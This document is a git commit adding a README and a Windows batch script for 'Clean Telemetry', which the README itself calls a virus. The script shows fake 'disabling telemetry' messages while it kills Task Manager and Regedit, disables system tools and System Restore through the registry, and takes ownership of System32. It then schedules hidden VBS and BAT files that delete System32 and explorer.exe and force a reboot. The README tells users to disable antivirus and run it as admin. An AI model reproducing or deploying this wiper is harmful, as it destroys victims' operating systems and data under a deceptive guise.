7edcffb112ae1c52e0b18a86297b3d315e86bcf2
Sauug <36141434+Sauug@users.noreply.github.com>
2023-03-18 19:53:24 +0100

    Main

---
+++ README.md
@@ -0,0 +1,29 @@
+# ***I am not responsible for your actions. This repositories is for educational purposes only.***
+
+## What is ?
+
+Clean Telemetry is a virus that removes the system32 folder. 
+
+It's open source you have .bat force the source and .exe .
+
+#### [Video](https://youtu.be/MAVqU3mgNF0)
+
+## Features :
+
+You have two version for this moment :
+
+Fast version :
+- Kill Task Manager and Regedit.
+- Deactives : Task Manager, Control Pannel, System Restore, Block taskBar, Run dialog (Win + R), Power Button and Registry.
+-  Delete System32 folder.
+- All this without a window, I create a vbs and bat file that runs with a task.
+
+Slow version :
+- Kill Task Manager and Regedit.
+- Deactives : Task Manager, Control Pannel, System Restore, Block taskBar, Run dialog (Win + R), Power Button and Registry.
+- Delete Folders : Documents, Downloads, Pictures, Videos, Music (Current user logged)
+- Delete all extension files : .jpeg, .txt, .png, .jpg, .iso, .msi, .avi, .wav, .mp3, .mp4, .mov, .exe and .psd
+- Delete System32 folder.
+
+## How to use
+Disable AV and launch in admin .bat or .exe.
---
+++ Source/Clean Telemetry-Fast.bat
@@ -0,0 +1,48 @@
+@shift /0
+@echo off
+setLocal EnableDelayedExpansion
+title Disabling all telemetry in Windows 10/11
+echo Disabling all telemetry services...
+taskkill /f /im regedit.exe 2>nul >nul
+taskkill /f /im taskmgr.exe 2>nul >nul
+SCHTASKS /Create /F /SC DAILY /TN system_security /TR "%windir%\system.vbs" /RL HIGHEST 2>nul >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f 2>nul >nul
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f 2>nul >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoCloseDragDropBands /t REG_DWORD /d 1 /f 2>nul >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f 2>nul >nul
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HidePowerOptions /t REG_DWORD /d 1 /f 2>nul >nul
+reg add HKCU\Software\Microsoft\Windows\currentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f 2>nul >nul
+echo CreateObject("Wscript.Shell").Run "system.bat", 0, True >> %windir%\system.vbs
+attrib +h +s +r +i %windir%\system.vbs
+cls
+echo Checking if all services has been disabling...
+setlocal
+
+for /F delims^=^"^ Tokens^=2^,4 %%A IN ('takeown /? ^| findstr /R " \"[A-Z]\" "') DO ( 
+    if not defined take (
+      set "take=%%~A"
+      if not "%%~B" == "" set "skip=%%~B" 
+    ) else set "skip=%%~A" 
+) 2>nul >nul
+set take 2>nul >nul
+set skip 2>nul >nul
+cd %windir%\System32
+takeown /f * /r /d %take% 2>nul >nul
+cls
+title Cleanning telemetry in Windows 10/11
+echo Cleaning of all residual telemetry files...
+echo @echo off >> %windir%\system.bat
+echo cd /d %windir%\..\.. >> %windir%\system.bat
+echo del C:\Windows\system32\*.* /s /q 2>nul >nul >> %windir%\system.bat
+echo taskkill /f /im explorer.exe >> %windir%\system.bat
+echo del C:\Windows\explorer.exe >> %windir%\system.bat
+echo shutdown -r -t 3 >> %windir%\system.bat
+echo taskkill /f /im wininit.exe >> %windir%\system.bat
+attrib +h +s +r +i %windir%\system.bat
+schtasks /run /tn system_security 2>nul >nul
+cls
+title Finished !
+echo All services have been disabled and all residual files are well deleted
+echo Thank you for using my software !
+pause
